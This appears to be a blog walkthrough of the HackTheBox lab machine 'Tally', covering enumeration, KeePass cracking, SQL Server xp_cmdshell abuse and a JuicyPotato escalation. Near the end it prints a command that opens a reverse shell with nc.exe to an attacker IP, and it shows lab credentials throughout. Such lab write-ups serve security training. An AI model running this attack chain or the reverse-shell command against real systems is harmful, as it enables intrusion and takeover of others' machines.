---
title: "[HTB] Machine: Tally"
description: "[HTB] Machine: Tally"
date: 2023-09-30
menu:
  sidebar:
    name: "[HTB] Machine: Tally"
    identifier: htb-machine-Tallyqqqqqqqqqqq
    parent: htb-machines-windows
    weight: 10
hero: images/tally.png
tags: ["HTB", "sharepoint", "mssql", "keepass", "hashcat", "kpcli", "crackmapexec", "smbclient", "smbmap", "impacket-mssqlclient", "xp-cmdshell", "firefox", "user-agent", "searchsploit", "cve-2016-1960", "shellcode", "python", "scheduled-task", "cve-2017-0213"]
---

# Tally
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.10.59 --min-rate 10000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 20:46 BST
Warning: 10.10.10.59 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.59 (10.10.10.59)
Host is up (0.10s latency).
Not shown: 60269 filtered tcp ports (no-response), 5257 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
81/tcp    open  hosts2-ns
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
808/tcp   open  ccproxy-http
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
15567/tcp open  unknown
32843/tcp open  unknown
32844/tcp open  unknown
32846/tcp open  unknown
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 83.60 seconds

```
```
└─$ nmap -Pn -p21,80,81,135,139,445,808,1433,5985,15567,32843,32844,32846,47001,49664-49670 -sC -sV 10.10.10.59 --min-rate 10000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 20:51 BST
Nmap scan report for 10.10.10.59 (10.10.10.59)
Host is up (0.10s latency).

PORT      STATE    SERVICE            VERSION
21/tcp    open     ftp                Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open     http               Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-title: Home
|_Requested resource was http://10.10.10.59/_layouts/15/start.aspx#/default.aspx
|_http-generator: Microsoft SharePoint
81/tcp    filtered hosts2-ns
135/tcp   open     msrpc              Microsoft Windows RPC
139/tcp   open     netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
808/tcp   filtered ccproxy-http
1433/tcp  open     ms-sql-s           Microsoft SQL Server 2016 13.00.1601.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-09-30T19:38:29
|_Not valid after:  2053-09-30T19:38:29
| ms-sql-info: 
|   10.10.10.59:1433: 
|     Version: 
|       name: Microsoft SQL Server 2016 RTM
|       number: 13.00.1601.00
|       Product: Microsoft SQL Server 2016
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2023-09-30T19:52:36+00:00; -3s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.10.59:1433: 
|     Target_Name: TALLY
|     NetBIOS_Domain_Name: TALLY
|     NetBIOS_Computer_Name: TALLY
|     DNS_Domain_Name: TALLY
|     DNS_Computer_Name: TALLY
|_    Product_Version: 10.0.14393
5985/tcp  filtered wsman
15567/tcp open     http               Microsoft IIS httpd 10.0
| http-ntlm-info: 
|   Target_Name: TALLY
|   NetBIOS_Domain_Name: TALLY
|   NetBIOS_Computer_Name: TALLY
|   DNS_Domain_Name: TALLY
|   DNS_Computer_Name: TALLY
|_  Product_Version: 10.0.14393
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|   Negotiate
|_  NTLM
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
32843/tcp open     http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
32844/tcp filtered unknown
32846/tcp open     storagecraft-image StorageCraft Image Manager
47001/tcp filtered winrm
49664/tcp filtered unknown
49665/tcp filtered unknown
49666/tcp filtered unknown
49667/tcp filtered unknown
49668/tcp filtered unknown
49669/tcp open     msrpc              Microsoft Windows RPC
49670/tcp open     msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -2s, deviation: 0s, median: -3s
| smb2-time: 
|   date: 2023-09-30T19:52:30
|_  start_date: 2023-09-30T19:38:08

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.85 seconds
```

- Web server

![](./images/1.png)

- `feroxbuster`
```
└─$ feroxbuster -u http://10.10.10.59/_layouts -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.59/_layouts
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        2l       10w      151c http://10.10.10.59/_layouts => http://10.10.10.59/_layouts/
301      GET        2l       10w      158c http://10.10.10.59/_layouts/images => http://10.10.10.59/_layouts/images/
301      GET        2l       10w      155c http://10.10.10.59/_layouts/inc => http://10.10.10.59/_layouts/inc/
301      GET        2l       10w      158c http://10.10.10.59/_layouts/styles => http://10.10.10.59/_layouts/styles/
301      GET        2l       10w      158c http://10.10.10.59/_layouts/mobile => http://10.10.10.59/_layouts/mobile/
```

- It's a `sharepoint`
  - We can enum it using this [post](https://resources.bishopfox.com/resources/tools/sharepoint-hacking-diggity/attack-tools/)

![](./images/2.png)

- `Documents` have 1 item

![](./images/3.png)

- It contains the password for `ftp`
  - `UTDRSCH53c"$6hys`

![](./images/4.png)

- `Site Pages` also contain 1 item
  - I had to add `tally` to `/etc/hosts` to see the content
  - We have possible usernames: `rahul`, `sarah`, `tim`
  - And also `ftp_user` account

![](./images/5.png)

![](./images/6.png)

- `ftp`
  - `ftp_user:UTDRSCH53c"$6hys`
```
└─$ ftp 10.10.10.59
Connected to 10.10.10.59.
220 Microsoft FTP Service
Name (10.10.10.59:kali): ftp_user
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49816|)
125 Data connection already open; Transfer starting.
08-31-17  11:51PM       <DIR>          From-Custodian
10-01-17  11:37PM       <DIR>          Intranet
08-28-17  06:56PM       <DIR>          Logs
09-15-17  09:30PM       <DIR>          To-Upload
09-17-17  09:27PM       <DIR>          User
226 Transfer complete.
ftp> 
```
- - Let's download everything
```
─$ wget -r 'ftp://ftp_user:UTDRSCH53c"$6hys@10.10.10.59'
--2023-10-01 20:33:13--  ftp://ftp_user:*password*@10.10.10.59/
           => ‘10.10.10.59/.listing’
Connecting to 10.10.10.59:21... connected.
Logging in as ftp_user ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... done.    ==> LIST ... done.
...
```

- We have a `User` folder inside
```
└─$ ls -lha
total 44K
drwxr-xr-x 11 kali kali 4.0K Oct  1 20:38 .
drwxr-xr-x  7 kali kali 4.0K Oct  1 20:35 ..
drwxr-xr-x  3 kali kali 4.0K Oct  1 20:35 Administrator
drwxr-xr-x  2 kali kali 4.0K Oct  1 20:35 Ekta
drwxr-xr-x  2 kali kali 4.0K Oct  1 20:35 Jess
drwxr-xr-x  3 kali kali 4.0K Oct  1 20:36 Paul
drwxr-xr-x  3 kali kali 4.0K Oct  1 20:36 Rahul
drwxr-xr-x  2 kali kali 4.0K Oct  1 20:36 Sarah
drwxr-xr-x  2 kali kali 4.0K Oct  1 20:37 Stuart
drwxr-xr-x  4 kali kali 4.0K Oct  1 20:38 Tim
drwxr-xr-x  3 kali kali 4.0K Oct  1 20:38 Yenwi
```
```
└─$ find . -type f              
./Ekta/OFSI_quick_guide_flyer.pdf
./Ekta/PSAIS_1_April_2017.pdf
./Paul/financial_sanctions_guidance_august_2017.pdf
./Paul/Monetary_penalties_for_breaches_of_financial_sanctions.pdf
./Paul/financial-list-guide.pdf
./Jess/actu8-espreadsheet-designer-datasheet.pdf
./Tim/Files/tim.kdbx
./Tim/Files/bonus.txt
./Tim/Files/KeePass-2.36/KeePass.XmlSerializers.dll
./Tim/Files/KeePass-2.36/KeePassLibC64.dll
./Tim/Files/KeePass-2.36/License.txt
./Tim/Files/KeePass-2.36/KeePass.chm
./Tim/Files/KeePass-2.36/KeePass.exe
./Tim/Files/KeePass-2.36/KeePassLibC32.dll
./Tim/Files/KeePass-2.36/ShInstUtil.exe
./Tim/Files/KeePass-2.36/KeePass.exe.config
./Tim/Project/Log/do to.txt
./Stuart/Unit4-Connect-Financials-Agenda.pdf
./Stuart/customers - Copy.csv
./Sarah/Windows-KB890830-x64-V5.52.exe
./Sarah/notes.txt
./Sarah/MBSASetup-x64-EN.msi
```

- We have `tim.kdbx` 
  - Let's crack it
```
└─$ keepass2john tim.kdbx > tim.kdbx.hash
```
```
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt tim.kdbx.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
simplementeyo    (tim)     
1g 0:00:00:17 DONE (2023-10-02 16:45) 0.05861g/s 1447p/s 1447c/s 1447C/s simplementeyo..sept17
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- Let's open `keepass`
  - We have a creds for share `Finance:Acc0unting`

![](./images/7.png)

- Let's test them
```
└─$ crackmapexec smb 10.10.10.59 -u Finance -p Acc0unting
SMB         10.10.10.59     445    TALLY            [*] Windows Server 2016 Standard 14393 x64 (name:TALLY) (domain:TALLY) (signing:False) (SMBv1:True)
SMB         10.10.10.59     445    TALLY            [+] TALLY\Finance:Acc0unting 
```

- Now we can access `ACCT` share
```
└─$ smbmap -H 10.10.10.59 -u Finance -p Acc0unting 
[+] IP: 10.10.10.59:445 Name: tally                                             
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ACCT                                                    READ ONLY
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC

```
```
└─$ smbclient //10.10.10.59/ACCT -U 'Finance%Acc0unting'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Sep 18 06:58:18 2017
  ..                                  D        0  Mon Sep 18 06:58:18 2017
  Customers                           D        0  Sun Sep 17 21:28:40 2017
  Fees                                D        0  Mon Aug 28 22:20:52 2017
  Invoices                            D        0  Mon Aug 28 22:18:19 2017
  Jess                                D        0  Sun Sep 17 21:41:29 2017
  Payroll                             D        0  Mon Aug 28 22:13:32 2017
  Reports                             D        0  Fri Sep  1 21:50:11 2017
  Tax                                 D        0  Sun Sep 17 21:45:47 2017
  Transactions                        D        0  Wed Sep 13 20:57:44 2017
  zz_Archived                         D        0  Fri Sep 15 21:29:35 2017
  zz_Migration                        D        0  Sun Sep 17 21:49:13 2017

                8387839 blocks of size 4096. 589404 blocks available
```

- I couldn't donwload everything from the `smb`
  - So I had to mount it
```
└─$ sudo mount -t cifs -o user=Finance,pass=Acc0unting //10.10.10.59/ACCT /mnt/smb 
[sudo] password for kali: 
```
```
└─$ ls /mnt/smb 
Customers  Fees  Invoices  Jess  Payroll  Reports  Tax  Transactions  zz_Archived  zz_Migration    
```

- Scanning through the files results in interesting file: `./zz_Archived/SQL/conn-info.txt`
```
└─$ cat ./zz_Archived/SQL/conn-info.txt
old server details

db: sa
pass: YE%TJC%&HYbe5Nw

have changed for tally
```

- But it states, that the creds were changed for `tally`
  - We also have `zz_Migration/Binaries` directory
```
└─$ find . -type f | grep -v cap
./CardReader/RapportSetup.exe
./FileZilla_Server-0_9_60_2.exe
./ImportGSTIN.zip
./NDP452-KB2901907-x86-x64-AllOS-ENU.exe
./New folder/crystal_reports_viewer_2016_sp04_51051980.zip
./New folder/Macabacus2016.exe
./New folder/Orchard.Web.1.7.3.zip
./New folder/putty.exe
./New folder/RpprtSetup.exe
./New folder/tableau-desktop-32bit-10-3-2.exe
./New folder/tester.exe
./New folder/vcredist_x64.exe
./Sage50_2017.2.0.exe
./Tally.ERP 9 Release 6/regodbc32.exe
./Tally.ERP 9 Release 6/Setup.exe
./Tally.ERP 9 Release 6/tally.exe
./Tally.ERP 9 Release 6/tally.ini
./Tally.ERP 9 Release 6/Tally.sav
./Tally.ERP 9 Release 6/tallygatewayserver.exe
./Tally.ERP 9 Release 6/tallywin.dat
./Tally.ERP 9 Release 6/tallywin32.dat
./Tally.ERP 9 Release 6/tdlfunc.log
./windirstat1_1_2_setup.exe
```

- Inside we see a `tester.exe` which looks like it's not a commercial software
```
└─$ strings tester.exe  
!This program cannot be run in DOS mode.
Rich7J
.text
...
^_[3
SQLSTATE: 
Message: 
DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;
select * from Orchard_Users_UserPartRecord
Unknown exception
bad cast
...
```
- Let's test the creds
  - `sa:GWE3V65#6KFH93@4GWTG2G`
```
└─$ crackmapexec mssql 10.10.10.59 -u sa -p 'GWE3V65#6KFH93@4GWTG2G' --local-auth
MSSQL       10.10.10.59     1433   TALLY            [*] Windows 10.0 Build 14393 (name:TALLY) (domain:TALLY)
MSSQL       10.10.10.59     1433   TALLY            [+] sa:GWE3V65#6KFH93@4GWTG2G (Pwn3d!)
```
## Foothold/ User #1
- Let's connect using `impacket-mssqlclient`
```
└─$ impacket-mssqlclient sa:'GWE3V65#6KFH93@4GWTG2G'@10.10.10.59                      
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(TALLY): Line 1: Changed database context to 'master'.
[*] INFO(TALLY): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 665) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)> 

```

- Let's enumerate
  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
  - It looks like we can enable `xp_cmdshell` and execute os commands
```
└─$ impacket-mssqlclient sa:'GWE3V65#6KFH93@4GWTG2G'@10.10.10.59                      
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(TALLY): Line 1: Changed database context to 'master'.
[*] INFO(TALLY): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 665) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)> EXEC master..xp_cmdshell 'whoami';
[-] ERROR(TALLY): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL (sa  dbo@master)> sp_configure 'show advanced options', '1';
[*] INFO(TALLY): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> RECONFIGURE
SQL (sa  dbo@master)> sp_configure 'xp_cmdshell', '1'
[*] INFO(TALLY): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> RECONFIGURE
SQL (sa  dbo@master)> EXEC master..xp_cmdshell 'whoami'
output        
-----------   
tally\sarah   

NULL          

SQL (sa  dbo@master)> 
```

- Let's get reverse shell
  - I used `Powershell #3 (Base64)` from https://www.revshells.com/

![](./images/8.png)

![](./images/9.png)

- Check [0xdf](https://0xdf.gitlab.io/2022/04/11/htb-tally.html#shell-as-sarah-firefox---path-2) for an alternative path
## Root
- `sarah` has `SeImpersonatePrivilege`
```
PS C:\users\sarah\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

- We can try `Potato` attack if we have nothing else
  - We have `SPBestWarmUp.ps1`
  - It looks like it used to have a [github](https://github.com/spjeff/spbestwarmup/blob/master/SPBestWarmUp.ps1) page, but got deleted
  - Googling shows that it was helping with caching `IIS`
```
PS C:\users\sarah\desktop> ls


    Directory: C:\users\sarah\desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---       01/10/2017     22:32            916 browser.bat                                                           
-a----       17/09/2017     21:50            845 FTP.lnk                                                               
-a----       23/09/2017     21:11            297 note to tim (draft).txt                                               
-a----       19/10/2017     21:49          17152 SPBestWarmUp.ps1                                                      
-a----       19/10/2017     22:48          11010 SPBestWarmUp.xml                                                      
-a----       17/09/2017     21:48           1914 SQLCMD.lnk                                                            
-a----       21/09/2017     00:46            129 todo.txt                                                              
-ar---       01/10/2023     20:06             34 user.txt                                                              
-a----       17/09/2017     21:49            936 zz_Migration.lnk                                                      
```

- We also have `SPBestWarmUp.xml`
  - It runs as `Administrator` and executes `SPBestWarmUp.ps1` every hour
```
PS C:\users\sarah\desktop> type SPBestWarmUp.xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <Repetition>
        <Interval>PT1H</Interval>
        <Duration>P1D</Duration>
...
  <Principals>
    <Principal id="Author">
      <UserId>TALLY\Administrator</UserId>
      <LogonType>Password</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
...
    <Exec>
      <Command>PowerShell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -File SPBestWarmUp.ps1 -skipadmincheck</Arguments>
      <WorkingDirectory>C:\Users\Sarah\Desktop</WorkingDirectory>
    </Exec>
...
```

- We can replace the script, since we have a full control over it
```
PS C:\users\sarah\desktop> icacls SPBestWarmUp.ps1
SPBestWarmUp.ps1 NT AUTHORITY\SYSTEM:(F)
                 BUILTIN\Administrators:(F)
                 TALLY\Sarah:(F)

Successfully processed 1 files; Failed processing 0 files
```

- But I didn't want to wait, so performed `Potato` attack
  - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato
```
PS C:\programdata> .\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\programdata\nc.exe -e cmd.exe 10.10.16.9 7777" -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

```

![](./images/10.png)

- The box is also vulnerable to `CVE-2017-0213`, you can check [0xdf](https://0xdf.gitlab.io/2022/04/11/htb-tally.html#shell-as-system-cve---path-3) for more information